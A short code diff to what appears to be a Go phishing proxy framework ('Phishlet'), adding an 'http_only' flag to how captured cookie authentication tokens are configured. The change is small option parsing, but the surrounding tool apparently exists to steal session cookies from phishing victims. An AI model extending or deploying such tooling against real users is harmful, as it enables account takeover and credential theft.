@@ -944,6 +944,8 @@ func (p *Phishlet) addCookieAuthTokens(hostname string, tokens []string) error {
 					at.optional = true
 				case "always":
 					at.always = true
+				case "http_only":
+					at.http_only = true
 				}
 			}
 			p.cookieAuthTokens[hostname] = append(p.cookieAuthTokens[hostname], at)
